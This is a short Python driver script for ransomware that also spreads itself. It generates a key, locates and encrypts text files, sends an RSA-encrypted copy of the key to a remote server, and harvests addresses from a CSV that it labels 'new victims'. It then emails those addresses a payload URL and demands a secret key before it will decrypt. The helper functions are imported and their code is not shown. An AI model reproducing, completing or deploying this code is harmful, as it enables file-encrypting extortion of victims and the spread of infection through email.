from utils import waitingForKey, generate_key, findTxtFileAndSaveThemTo, encrypt_ascii_key_with_server_RSA_and_send_to_server, encrypt_file_paths, saveKey, decrypt_file_paths, get_emails_from_csv, send_to_emails

#1
ascii_key = generate_key(16)
print("ascii_key vvvv\n" + ascii_key)

#2
file_contains_paths ="paths.txt"
findTxtFileAndSaveThemTo( file_contains_paths )

#3
encoded_encrypted_msg, credentials, payload_url = encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key)

#4
encrypt_file_paths(ascii_key, file_contains_paths)

#5
saveKey(ascii_key, "Key.key")

#6
saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")

#7
emails = get_emails_from_csv()
print("New victims emails :", emails)

#8
send_to_emails(emails, credentials, payload_url)
print("Payload URL:", payload_url)
print("Payload was sent successfully!")

#9
waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
decrypt_file_paths(ascii_key, file_contains_paths)

input("Press Enter To Close...")